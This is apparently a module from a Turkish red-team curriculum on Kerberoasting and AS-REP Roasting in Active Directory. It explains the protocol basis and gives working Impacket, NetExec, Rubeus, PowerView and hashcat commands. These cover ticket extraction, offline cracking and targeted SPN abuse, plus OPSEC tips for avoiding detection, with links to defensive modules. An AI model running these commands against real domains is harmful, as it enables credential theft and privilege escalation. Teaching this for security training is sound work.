## 1. Kavramsal Temel — Neden Var?

Kerberos'un tasarımında, saldırgana **offline kırılabilir parola hash'i** veren iki yapısal özellik vardır. İkisi de "açık" değil, protokolün nasıl çalıştığının doğal sonucudur:

> **Kerberoasting:** Herhangi bir kullanıcı, bir servis (SPN) için TGS bileti isteyebilir. Bilet, o servis hesabının **NT hash'i ile şifrelenir**. Saldırgan bileti alır, offline kırar → servis hesabının parolası.
>
> **AS-REP Roasting:** Ön kimlik doğrulaması (pre-auth) kapalı bir hesap için, AS-REP yanıtının bir kısmı **o hesabın hash'i ile** şifrelenir ve **kimlik göstermeden** alınabilir.

Neden bu kadar güçlü? Çünkü **kırma tamamen offline'dır** — DC ile hiç etkileşmeden, kilitlenme olmadan, milyonlarca deneme yapabilirsin. Servis hesapları çoğu zaman eski, uzun ömürlü ve zayıf parolalıdır (`Sql2019!`), üstelik sıklıkla yüksek yetkilidir.

**Analoji:** Kerberoasting = "kilitli bir kasanın kopyasını eve götürmek". Kasayı orada zorlamazsın (alarm), kopyasını evde istediğin kadar zaman harcayıp açarsın. DC hiçbir başarısız deneme görmez.

## 2. Teknik Derinlik — TGS-REQ/REP ve Şifreleme

### 2.1 Kerberoasting: TGS bilet akışı

```
   İstemci (herhangi bir kullanıcı)              KDC (DC)
     │ TGS-REQ:  "MSSQLSvc/sql01 için bilet ver" │
     │───────────────────────────────────────────▶│
     │ TGS-REP:  ST (Service Ticket)              │
     │   enc-part = E_Ks(servis oturum anahtarı…) │  ← Ks = svc-sql'in NT hash'inden türetilir!
     │◀───────────────────────────────────────────│
              │
              ▼  enc-part'ı çıkar → $krb5tgs$...
        offline kır (Hashcat 13100/19700)
```

**Kritik nokta:** ST'nin `enc-part`'ı **servis hesabının uzun-dönem anahtarıyla** (NT hash / AES key) şifrelenir. Bileti isteyen herkes bu şifreli bloğu alır → offline kırar.

### 2.2 Şifreleme türü (etype) neden önemli?

| etype | Algoritma | Hashcat mode | Kırma zorluğu |
|-------|-----------|--------------|---------------|
| 23 (RC4-HMAC) | NT hash doğrudan | **13100** | Kolay (hızlı) |
| 17/18 (AES128/256) | PBKDF2 türetme | 19600/19700 | Çok daha yavaş |

Saldırgan TGS-REQ'te **RC4 (etype 23) talep etmeye çalışır** (`msDS-SupportedEncryptionTypes` izin veriyorsa) — çünkü RC4 hash'i kırmak AES'ten kat kat hızlıdır. Savunma bu yüzden **AES zorlar** → [Blue 06.3](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/06.3_AES_Zorlama_RC4_ve_PAC.md).

### 2.3 AS-REP Roasting: pre-auth kapalı akış

```
   İstemci                                       KDC (DC)
     │ AS-REQ (pre-auth verisi YOK)               │
     │───────────────────────────────────────────▶│
     │ AS-REP:  enc-part = E_Kuser(oturum anah…)  │  ← Kuser = kurbanın hash'i
     │◀───────────────────────────────────────────│   pre-auth kapalıysa DC direkt yanıtlar
        → $krb5asrep$23$user@REALM:...  → Hashcat 18200
```

Normalde pre-auth, `AS-REQ`'e kullanıcının hash'iyle şifreli bir zaman damgası eklenmesini zorunlu kılar (böylece "önce parolayı bil" ilkesi). `DONT_REQ_PREAUTH` bunu kaldırır → DC, parola bilmeyen birine bile şifreli blob verir.

### 2.4 Neden servis hesabının anahtarı? — anahtar türetme

Kerberos'ta bir "principal"in uzun-dönem anahtarı parolasından türetilir:

```
   RC4 (etype 23):  K = MD4(UTF16-LE(parola)) = NT hash  (tuz YOK, iterasyon YOK)
   AES256 (etype 18): K = PBKDF2-HMAC-SHA1(parola, salt=REALM+username, 4096 iter)
```

Bir servis hesabına ait SPN için istenen ST'nin `enc-part`'ı bu `K` ile şifrelenir. RC4 durumunda kırma **doğrudan NT hash tahminidir** (tuzsuz, hızlı); AES'te her deneme 4096 PBKDF2 iterasyonu maliyetlidir. Bu yüzden saldırgan RC4 talep etmeye çalışır, savunmacı AES zorlar.

### 2.5 Kerberoasting'in "yetkisiz" gücü ve gizli varyantlar

- **Herhangi bir kullanıcı** herhangi bir SPN için TGS isteyebilir — hedef servise erişim yetkisi gerekmez. Bu, tek düşük-yetki hesabın tüm servis hesaplarını roast etmesini sağlar.
- **Timeroast** (yeni): NTP kimlik doğrulaması üzerinden bilgisayar hesaplarını roast etme; farklı bir yüzey.
- **Targeted Kerberoast:** `GenericWrite` yetkin varsa bir kurbana **geçici SPN yaz**, roast et, SPN'i sil → SPN'i olmayan hesabı bile roast edilebilir yaparsın ([Modül 05](../Modul_05_Yetki_Yukseltme_ACL_ve_GPO/)).

## 3. Pratik Uygulama — Çok Araçlı

### 3.1 Kerberoasting

```bash
# Impacket — SPN'li tüm hesapları roast et
impacket-GetUserSPNs corp.local/jsmith:'Welcome1' -dc-ip 10.10.10.5 -request -outputfile kerb.txt

# NetExec
nxc ldap 10.10.10.5 -u jsmith -p 'Welcome1' --kerberoasting kerb.txt

# Targeted (tek yüksek-değerli SPN, düşük iz)
impacket-GetUserSPNs corp.local/jsmith:'Welcome1' -dc-ip 10.10.10.5 -request-user svc-sql
```

```powershell
# Windows-içi — Rubeus (en zengin, etype seçimi dahil)
Rubeus.exe kerberoast /outfile:kerb.txt
Rubeus.exe kerberoast /rc4opsec        # sadece AES-desteklemeyen hesapları hedefle (RC4 kırılabilir)
Rubeus.exe kerberoast /user:svc-sql /nowrap
```

**Örnek çıktı:**
```
$krb5tgs$23$*svc-sql$CORP.LOCAL$MSSQLSvc/sql01*$A1B2C3...   ← etype 23 = kolay kırım
```

### 3.2 AS-REP Roasting

```bash
# Impacket — kimliksiz (users.txt ile) veya kimlikli (LDAP'tan otomatik)
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.10.10.5 -no-pass -format hashcat -outputfile asrep.txt
impacket-GetNPUsers corp.local/jsmith:'Welcome1' -request -format hashcat -dc-ip 10.10.10.5
```

```powershell
Rubeus.exe asreproast /outfile:asrep.txt /format:hashcat
```

### 3.3 Offline kırma (Hashcat)

```bash
hashcat -m 13100 kerb.txt rockyou.txt -r rules/best64.rule     # Kerberoast RC4
hashcat -m 19700 kerb_aes.txt rockyou.txt                       # Kerberoast AES256
hashcat -m 18200 asrep.txt rockyou.txt -r rules/best64.rule     # AS-REP RC4
```

### 3.4 Targeted Kerberoast (SPN olmayan hedefi roast et)

```powershell
# GenericWrite yetkin olan bir kurbana geçici SPN yaz → roast → temizle
Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/roast'}
Rubeus.exe kerberoast /user:victim /nowrap
Set-DomainObject -Identity victim -Clear serviceprincipalname   # izi temizle
```

```bash
# targetedKerberoast.py — otomatik (yaz→roast→sil)
targetedKerberoast.py -d corp.local -u jdoe -p 'Welcome1' --dc-ip 10.10.10.5
```

**Örnek Rubeus çıktısı (etype farkı):**
```
[*] SamAccountName    : svc-sql
[*] Encryption type   : rc4_hmac (23)          ← kolay kırım
[*] Hash              : $krb5tgs$23$*svc-sql$...
[*] SamAccountName    : svc-modern
[*] Encryption type   : aes256_cts_hmac_sha1 (18)  ← yavaş; AES zorlanmış
```

| AS-REP Roasting | **T1558.004** (AS-REP Roasting) | **4768** with `Pre-Auth Type = 0`, etype 23 | [Blue 02.3](../../2-Blue_Team/Modul_02_SIEM_ve_Tespit_Muhendisligi/02.3_Kerberoasting_AS_REP_Tespiti.md) |
| RC4 zorlama (downgrade) | T1558 | 4769 etype 0x17 AES-yetenekli ortamda anomali | [Blue 06.3 — AES/RC4/PAC](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/06.3_AES_Zorlama_RC4_ve_PAC.md) |

**OPSEC notları:**
- **Toplu roast = kırmızı bayrak.** Tek bir kimliğin dakikalar içinde 50 SPN için 4769 üretmesi klasik Kerberoast imzasıdır ([Blue 02.3](../../2-Blue_Team/Modul_02_SIEM_ve_Tespit_Muhendisligi/02.3_Kerberoasting_AS_REP_Tespiti.md)). **Targeted roast** yap: BloodHound ([01.2](../Modul_01_Kesif_ve_Numaralandirma/01.2_SharpHound_ve_BloodHound.md)) ile yüksek-değerli + zayıf-parolalı adayı seç, sadece onu roast et.
- **RC4 talebi** (`/rc4opsec` ironi: adı OPSEC ama AES ortamında RC4 istemek anomalidir) — AES zorlayan ortamda RC4 TGS talebi tek başına yakalanır. Ortam RC4'e izin veriyorsa kullan; vermiyorsa AES'i kır (yavaş ama sessiz).
- **gMSA/dMSA** hesapları ([Sistem 03.4](../../1-Sistem_Yoneticisi/Modul_03_Nesne_ve_Kimlik_Yonetimi/03.4_gMSA_ve_FGPP.md)) 120+ karakter rastgele parolaya sahiptir → Kerberoast pratikte kırılamaz. Savunmanın cevabı budur; bu yüzden hedef **insan tarafından yönetilen** eski servis hesaplarıdır.
- Bal-SPN (honey SPN): savunmacı sahte, çekici bir SPN kurar; onu roast edersen alarm çalar → [Blue 04.4](../../2-Blue_Team/Modul_04_Yanal_Hareket_Tespiti/04.4_Honeytoken_ve_Honey_Account.md).
